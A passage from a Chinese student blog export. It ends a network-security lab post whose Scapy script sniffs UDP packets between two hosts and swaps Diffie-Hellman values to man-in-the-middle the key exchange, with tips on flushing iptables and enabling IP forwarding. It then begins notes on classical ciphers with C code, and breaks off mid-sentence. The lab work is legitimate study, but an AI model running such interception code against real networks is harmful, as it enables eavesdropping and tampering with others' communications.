class="built_in">str</span>(len_g)+<span class="built_in">str</span>(g)+<span class="built_in">str</span>(Yt)</span><br><span class="line">                newdata = newdata.encode()</span><br><span class="line">                Key_A=get_key(Ya,s,p)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;The Key with A is:&quot;</span>,Key_A)</span><br><span class="line">                newpkt = pkt</span><br><span class="line">                <span class="keyword">del</span>(newpkt[IP].<span class="built_in">len</span>)</span><br><span class="line">                <span class="keyword">del</span>(newpkt[UDP].payload)</span><br><span class="line">                sendp(newpkt/newdata)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> pkt.src == MAC_B <span class="keyword">and</span> pkt.dst == MAC_M:</span><br><span class="line">            pkt.src = MAC_M</span><br><span class="line">            pkt.dst = MAC_A</span><br><span class="line">            <span class="keyword">del</span> pkt[IP].chksum</span><br><span class="line">            <span class="keyword">del</span> pkt[UDP].chksum</span><br><span class="line">            <span class="keyword">if</span> pkt.haslayer(UDP) <span class="keyword">and</span> pkt[UDP].payload:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;The Packet is from Server2:&quot;</span>)</span><br><span class="line">                p_str=<span class="string">&quot;&quot;</span></span><br><span class="line">                g_str=<span class="string">&quot;&quot;</span></span><br><span class="line">                Yb_str=<span class="string">&quot;&quot;</span></span><br><span class="line">                data = pkt[UDP].payload.load</span><br><span class="line">                len_p=<span class="built_in">int</span>(data[<span class="number">1</span>])</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,len_p+<span class="number">2</span>):</span><br><span class="line">                      p_str+=<span class="built_in">str</span>(data[i])</span><br><span class="line">                p=<span class="built_in">int</span>(p_str)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;The received P is :&quot;</span>,p)</span><br><span class="line">                len_g=<span class="built_in">int</span>(data[len_p+<span class="number">2</span>])</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(len_p+<span class="number">3</span>,len_p+len_g+<span class="number">3</span>):</span><br><span class="line">                      g_str+=<span class="built_in">str</span>(data[i])</span><br><span class="line">                g=<span class="built_in">int</span>(g_str)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;The received g is :&quot;</span>,g)</span><br><span class="line">                len_msg=<span class="built_in">len</span>(data)</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(len_p+len_g+<span class="number">3</span>,len_msg):</span><br><span class="line">                      Yb_str+=<span class="built_in">str</span>(data[i])</span><br><span class="line">                Yb=<span class="built_in">int</span>(Yb_str)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;The received Yb is :&quot;</span>,Yb)</span><br><span class="line">                Ys=get_cal(g,s,p)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;The Ys with A is:&quot;</span>,Ys)</span><br><span class="line">                newdata=<span class="string">&quot;1&quot;</span>+<span class="built_in">str</span>(len_p)+<span class="built_in">str</span>(p)+<span class="built_in">str</span>(len_g)+<span class="built_in">str</span>(g)+<span class="built_in">str</span>(Ys)</span><br><span class="line">                newdata = newdata.encode()</span><br><span class="line">                Key_B=get_key(Yb,t,p)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;The Key with B is:&quot;</span>,Key_B)</span><br><span class="line">                newpkt = pkt</span><br><span class="line">                <span class="keyword">del</span>(newpkt[IP].<span class="built_in">len</span>)</span><br><span class="line">                <span class="keyword">del</span>(newpkt[UDP].payload)</span><br><span class="line">                sendp(newpkt/newdata)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line"></span><br><span class="line">pkt = sniff(<span class="built_in">filter</span>=<span class="string">&#x27;udp&#x27;</span>, prn=spoof_pkt)</span><br></pre></td></tr></table></figure>
<p>最后实现效果的截图，我直接贴上我的实验截图了：</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/QQ%E6%88%AA%E5%9B%BE20210619165615.png" alt="alt 5"></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/QQ%E6%88%AA%E5%9B%BE20210619165733.png" alt="alt 6"></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/QQ%E6%88%AA%E5%9B%BE20210619165900.png" alt="alt 7"></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/QQ%E6%88%AA%E5%9B%BE20210619170114.png" alt="alt 8"></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/202106192111.png" alt="alt 9"></p>
<p>完结撒花！！！</p>
<p>$PS:\ $如果$HostA$与$Server2$连不同的话，记得用$iptables\ -F$关闭防火墙，用$iptables\ -L$查看防火墙状态全部为$Accept \ $即可。</p>
<p>$PS:\ $打开$IP$转发使用命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo sysctl net.ipv4.ip_forward=1 <span class="comment">#打开IP转发</span></span><br><span class="line">sudo sysctl net.ipv4.ip_forward=0 <span class="comment">#关闭IP转发</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>网络攻防</category>
        <category>分级通关</category>
      </categories>
      <tags>
        <tag>网络攻防</tag>
      </tags>
  </entry>
  <entry>
    <title>密码学笔记之（一） 古典密码</title>
    <url>/2021/04/17/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AC%94%E8%AE%B0%E4%B9%8B%EF%BC%88%E4%B8%80%EF%BC%89-%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<hr>
<h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>密码学的目的是为了使两个处于不安全信道中通信的双方，在经过某种加密方法后，用过一种别人无法理解通信内容的方式进行通信。不安全信道是普遍内存在的，而绝对的加密是不存在的，本文将跟随我密码学课程的进行，对几种古典密码进行介绍和实现。</p>
<p><strong><em>密码体制：</em></strong></p>
<p>一个密码体制是满足以下条件的五元组$(P,C,K,ε,D)$：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">P</th>
<th style="text-align:center">明文组成的有限集</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">C</td>
<td style="text-align:center">密文组成的有限集</td>
</tr>
<tr>
<td style="text-align:center">K</td>
<td style="text-align:center">密钥空间</td>
</tr>
<tr>
<td style="text-align:center">ε</td>
<td style="text-align:center">加密规则</td>
</tr>
<tr>
<td style="text-align:center">D</td>
<td style="text-align:center">解密规则</td>
</tr>
</tbody>
</table>
</div>
<p>对每一个$k∈K，e_k∈ε，d_k∈D$且$e_k:P→C,d_k:C→P$均满足对于任意$x∈P$,有$d_k(e_k(x))=x$。</p>
<hr>
<h2 id="移位密码"><a href="#移位密码" class="headerlink" title="移位密码"></a>移位密码</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>移位密码的基础是数论中的模运算。基本定义为</p>
<ul>
<li><p>假设a和b均为整数，m是一正整数。若 $m | b-a$，则可将其表示为$a≡b(mod\,m)$，式 $a≡b(mod\;m)$，正整数$m$称为模数。</p>
</li>
<li><p>接下来的移位密码基于模26所得的完全剩余系进行实现。</p>
</li>
</ul>
<h3 id="密码体制"><a href="#密码体制" class="headerlink" title="密码体制"></a>密码体制</h3><p>令$P=C=K=Z_{26}$。对于$0\leq K\leq 25$，任意$x,y\in Z_{26}$，定义：$e_k(x)=(x+K)mod\;26$和$d_k(y)=(y-K)mod\;26$。当$K=3$时此密码称为凯撒密码。26个英文字符分别对应$Z_{26}$中的$0-25$。</p>
<p>加密过程为首先将明文转化为对应的整数串，再根据$K$的值对整数串进行移位处理，最后将处理后的整数串转化为密文对应的英文字符即可。</p>
<h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Shift_E</span><span class="params">()</span>    <span class="comment">//加密实现</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> p[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">char</span> c[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">int</span> k;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入明文串：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入移位密钥：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;k);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(p);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>((p[i]&gt;=<span class="string">&#x27;A&#x27;</span>)&amp;&amp;(p[i]&lt;=<span class="string">&#x27;Z&#x27;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            c[i]=((p[i]-<span class="string">&#x27;A&#x27;</span>)+k)%<span class="number">26</span>+<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>((p[i]&gt;=<span class="string">&#x27;a&#x27;</span>)&amp;&amp;(p[i]&lt;=<span class="string">&#x27;z&#x27;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            c[i]=((p[i]-<span class="string">&#x27;a&#x27;</span>)+k)%<span class="number">26</span>+<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(c);i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,c[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Shift_D</span><span class="params">()</span>    <span class="comment">//解密实现</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> c[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">char</span> p[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">int</span> k;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入密文串：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入移位密钥：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;k);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(c);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>((c[i]&gt;=<span class="string">&#x27;A&#x27;</span>)&amp;&amp;(c[i]&lt;=<span class="string">&#x27;Z&#x27;</span>))</span><br><span class="line">            p[i]=((c[i]-<span class="string">&#x27;A&#x27;</span>)-k+<span class="number">26</span>)%<span class="number">26</span>+<span class="string">&#x27;A&#x27;</span>;<span class="comment">//加上26以解决模的结果为负的情况</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>((c[i]&gt;=<span class="string">&#x27;a&#x27;</span>)&amp;&amp;(c[i]&lt;=<span class="string">&#x27;z&#x27;</span>))</span><br><span class="line">            p[i]=((c[i]-<span class="string">&#x27;a&#x27;</span>)-k+<span class="number">26</span>)%<span class="number">26</span>+<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(p);i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,p[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>实例实现效果如下：</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210417185750.png" alt="alt 移位密码实现"></p>
<h2 id="代换密码"><a href="#代换密码" class="headerlink" title="代换密码"></a>代换密码</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><ul>
<li><p>移位密码是代换密码的一种特殊情况，其只是包含了$26!\;$置换中的26种情况，下面的代换密码可以理解为任一明文字符对应另一密文字符，故存在$26!\;$种情况。</p>
</li>
<li><p>加密函数对应一种置换  $\pi\;$，而解密函数是对应的逆置换。</p>
</li>
</ul>
<h3 id="密码体制-1"><a href="#密码体制-1" class="headerlink" title="密码体制"></a>密码体制</h3><ul>
<li>令$P=C=Z_{26}$。$K$是由$26$个数字$0,1…,25$的所有可能的置换组成。对任意的置换$\pi\in K$，定义：$e_{\pi}(x)=\pi(x)$和$d_{\pi}(y)=\pi^{-1}(y)$，这里$\pi^{-1}$表示置换$\pi$的逆置换。</li>
</ul>
<h3 id="代码实现-1"><a href="#代码实现-1" class="headerlink" title="代码实现"></a>代码实现</h3><ul>
<li>这里任意取一置换$\pi$，具体置换内容见下表（小写字母表示明文，大写字母表示密文）：</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">a</th>
<th style="text-align:center">b</th>
<th style="text-align:center">c</th>
<th style="text-align:center">d</th>
<th style="text-align:center">e</th>
<th style="text-align:center">f</th>
<th style="text-align:center">g</th>
<th style="text-align:center">h</th>
<th style="text-align:center">i</th>
<th style="text-align:center">j</th>
<th style="text-align:center">k</th>
<th style="text-align:center">l</th>
<th style="text-align:center">m</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">X</td>
<td style="text-align:center">N</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">A</td>
<td style="text-align:center">H</td>
<td style="text-align:center">P</td>
<td style="text-align:center">O</td>
<td style="text-align:center">G</td>
<td style="text-align:center">Z</td>
<td style="text-align:center">Q</td>
<td style="text-align:center">W</td>
<td style="text-align:center">B</td>
<td style="text-align:center">T</td>
</tr>
<tr>
<td style="text-align:center">n</td>
<td style="text-align:center">o</td>
<td style="text-align:center">p</td>
<td style="text-align:center">q</td>
<td style="text-align:center">r</td>
<td style="text-align:center">s</td>
<td style="text-align:center">t</td>
<td style="text-align:center">u</td>
<td style="text-align:center">v</td>
<td style="text-align:center">w</td>
<td style="text-align:center">x</td>
<td style="text-align:center">y</td>
<td style="text-align:center">z</td>
</tr>
<tr>
<td style="text-align:center">S</td>
<td style="text-align:center">F</td>
<td style="text-align:center">L</td>
<td style="text-align:center">R</td>
<td style="text-align:center">C</td>
<td style="text-align:center">V</td>
<td style="text-align:center">M</td>
<td style="text-align:center">U</td>
<td style="text-align:center">E</td>
<td style="text-align:center">K</td>
<td style="text-align:center">J</td>
<td style="text-align:center">D</td>
<td style="text-align:center">I</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li>则对应的逆置换$\pi^{-1}$ 为下表：</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th>A</th>
<th style="text-align:center">B</th>
<th style="text-align:center">C</th>
<th style="text-align:center">D</th>
<th style="text-align:center">E</th>
<th style="text-align:center">F</th>
<th style="text-align:center">G</th>
<th style="text-align:center">H</th>
<th style="text-align:center">I</th>
<th style="text-align:center">J</th>
<th style="text-align:center">K</th>
<th style="text-align:center">L</th>
<th style="text-align:center">M</th>
</tr>
</thead>
<tbody>
<tr>
<td>d</td>
<td style="text-align:center">l</td>
<td style="text-align:center">r</td>
<td style="text-align:center">y</td>
<td style="text-align:center">v</td>
<td style="text-align:center">o</td>
<td style="text-align:center">h</td>
<td style="text-align:center">e</td>
<td style="text-align:center">z</td>
<td style="text-align:center">x</td>
<td style="text-align:center">w</td>
<td style="text-align:center">p</td>
<td style="text-align:center">t</td>
</tr>
<tr>
<td>N</td>
<td style="text-align:center">O</td>
<td style="text-align:center">P</td>
<td style="text-align:center">Q</td>
<td style="text-align:center">R</td>
<td style="text-align:center">S</td>
<td style="text-align:center">T</td>
<td style="text-align:center">U</td>
<td style="text-align:center">V</td>
<td style="text-align:center">W</td>
<td style="text-align:center">X</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">Z</td>
</tr>
<tr>
<td>b</td>
<td style="text-align:center">g</td>
<td style="text-align:center">f</td>
<td style="text-align:center">j</td>
<td style="text-align:center">q</td>
<td style="text-align:center">n</td>
<td style="text-align:center">m</td>
<td style="text-align:center">u</td>
<td style="text-align:center">s</td>
<td style="text-align:center">k</td>
<td style="text-align:center">a</td>
<td style="text-align:center">c</td>
<td style="text-align:center">i</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li>代码展示如下：</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">map&lt;<span class="keyword">char</span>, <span class="keyword">char</span>&gt; E_k = &#123; &#123;<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;X&#x27;</span>&#125; ,&#123;<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;N&#x27;</span>&#125;,&#123;<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>&#125;,&#123;<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;A&#x27;</span>&#125;,&#123;<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;H&#x27;</span>&#125;,&#123;<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;P&#x27;</span>&#125;,&#123;<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;O&#x27;</span>&#125;,&#123;<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;G&#x27;</span>&#125;,&#123;<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;Z&#x27;</span>&#125;,&#123;<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>&#125;,&#123;<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;W&#x27;</span>&#125;,&#123;<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;B&#x27;</span>&#125;,&#123;<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;T&#x27;</span>&#125;,&#123;<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;S&#x27;</span>&#125;,&#123;<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;F&#x27;</span>&#125;,&#123;<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;L&#x27;</span>&#125;,&#123;<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;R&#x27;</span>&#125;,&#123;<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;C&#x27;</span>&#125;,&#123;<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;V&#x27;</span>&#125;,&#123;<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;M&#x27;</span>&#125;,&#123;<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;U&#x27;</span>&#125;,&#123;<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;E&#x27;</span>&#125;,&#123;<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;K&#x27;</span>&#125;,&#123;<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;J&#x27;</span>&#125;,&#123;<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;D&#x27;</span>&#125;,&#123;<span class="string">&#x27;z&#x27;</span>,<span class="string">&#x27;I&#x27;</span>&#125; &#125;;</span><br><span class="line">map&lt;<span class="keyword">char</span>,<span class="keyword">char</span>&gt; C_K=&#123;&#123;<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;d&#x27;</span>&#125;,&#123;<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;l&#x27;</span>&#125;,&#123;<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;r&#x27;</span>&#125;,&#123;<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;y&#x27;</span>&#125;,&#123;<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;v&#x27;</span>&#125;,&#123;<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;o&#x27;</span>&#125;,&#123;<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;h&#x27;</span>&#125;,&#123;<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;e&#x27;</span>&#125;,&#123;<span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;z&#x27;</span>&#125;,&#123;<span class="string">&#x27;J&#x27;</span>,<span class="string">&#x27;x&#x27;</span>&#125;,&#123;<span class="string">&#x27;K&#x27;</span>,<span class="string">&#x27;w&#x27;</span>&#125;,&#123;<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;p&#x27;</span>&#125;,&#123;<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;t&#x27;</span>&#125;,&#123;<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;b&#x27;</span>&#125;,&#123;<span class="string">&#x27;O&#x27;</span>,<span class="string">&#x27;g&#x27;</span>&#125;,&#123;<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;f&#x27;</span>&#125;,&#123;<span class="string">&#x27;Q&#x27;</span>,<span class="string">&#x27;j&#x27;</span>&#125;,&#123;<span class="string">&#x27;R&#x27;</span>,<span class="string">&#x27;q&#x27;</span>&#125;,&#123;<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;n&#x27;</span>&#125;,&#123;<span class="string">&#x27;T&#x27;</span>,<span class="string">&#x27;m&#x27;</span>&#125;,&#123;<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;u&#x27;</span>&#125;,&#123;<span class="string">&#x27;V&#x27;</span>,<span class="string">&#x27;s&#x27;</span>&#125;,&#123;<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;k&#x27;</span>&#125;,&#123;<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;a&#x27;</span>&#125;,&#123;<span class="string">&#x27;Y&#x27;</span>,<span class="string">&#x27;c&#x27;</span>&#125;,&#123;<span class="string">&#x27;Z&#x27;</span>,<span class="string">&#x27;i&#x27;</span>&#125;&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Sub_E</span><span class="params">()</span>  <span class="comment">//加密实现</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> p[<span class="number">100</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入明文串：&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;p);</span><br><span class="line">	<span class="keyword">char</span> c[<span class="number">100</span>];</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(p); i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">auto</span> x = E_k.<span class="built_in">find</span>(p[i]);</span><br><span class="line">		c[i] = x-&gt;second;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;密文串为：&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(c); i++)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, c[i]);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Sub_D</span><span class="params">()</span>  <span class="comment">//解密实现</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> c[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入密文串：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;c);</span><br><span class="line">    <span class="keyword">char</span> p[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(c);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> x=C_K.<span class="built_in">find</span>(c[i]);</span><br><span class="line">        p[i]=x-&gt;second;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;明文串为：&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(p);i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,p[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>实例实现效果如下：</li>
</ul>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210417235745.png" alt="alt 代换密码"></p>
<h2 id="仿射密码"><a href="#仿射密码" class="headerlink" title="仿射密码"></a>仿射密码</h2><h3 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h3><ul>
<li>引理1：设$a\in Z_m$ ，则对于任意的$b\in Z_m$ ，同余方程$ax\equiv b(mod\;m)$有唯一解$x\in Z_m$的充分必要条件是$gcd(a,m)=1$。</li>
<li>引理2：假定$m=\prod_{i=1}^np_i^{e_i}$，这里$p_i$均为素数且互不相同，$e_i&gt;0,1\leq i\leq n$。则关于其欧拉函数$\varphi(m)=\prod_{i=1}^n(p_i^{e_i}-p_i^{e_i-1})$。</li>
<li>定义1：设$a\in Z_m$，若存在$a^{‘}\in Z_m$，使得$aa^{‘}\equiv a{‘}a\equiv 1(mod\;m)$，则$a^{‘}$称为$a$ 在$Z_m$ 上的乘法逆，将其记为$a^{-1}mod\;m$。在$m$是固定的情形下，也可将其记为$a^{-1}$。</li>
</ul>
<h3 id="密码体制-2"><a href="#密码体制-2" class="headerlink" title="密码体制"></a>密码体制</h3><ul>
<li><p>令$P=C=Z_{26}$，且$K={(a,b)\in Z_{26}\times Z_{26}:gcd(a,26)=1}$</p>
<p>对任意的$K=(a,b)\in K,\;x,y\in Z_{26}$，定义$e_k(x)=(ax+b)mod\;26$和$d_k(y)=a^{-1}(y-b)mod\;26$。</p>
</li>
<li><p>$密钥K=(a,b),接下来以书本上的K=(7,3)举例进行代码实现$。</p>
</li>
</ul>
<h3 id="代码实现-2"><a href="#代码实现-2" class="headerlink" title="代码实现"></a>代码实现</h3><ul>
<li><p>加密函数如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Affine_E</span><span class="params">()</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">char</span> p[<span class="number">100</span>],c[<span class="number">100</span>];</span><br><span class="line">      <span class="keyword">int</span> a,b;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;请输入明文串：&quot;</span>);</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;p);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;请输入密钥K：&quot;</span>);</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;a,&amp;b);</span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(p);i++)</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">if</span>((p[i]&gt;=<span class="string">&#x27;A&#x27;</span>)&amp;&amp;(p[i]&lt;=<span class="string">&#x27;Z&#x27;</span>))</span><br><span class="line">              c[i]=(a*(p[i]-<span class="string">&#x27;A&#x27;</span>)+b)%<span class="number">26</span>+<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span>((p[i]&gt;=<span class="string">&#x27;a&#x27;</span>)&amp;&amp;(p[i]&lt;=<span class="string">&#x27;z&#x27;</span>))</span><br><span class="line">              c[i]=(a*(p[i]-<span class="string">&#x27;a&#x27;</span>)+b)%<span class="number">26</span>+<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;密文串为：&quot;</span>);</span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(c);i++)</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,c[i]);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>加密效果如下：<br><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210418125910.png" alt="alt 仿射密码加密"></p>
</li>
<li><p>解密算法如下：</p>
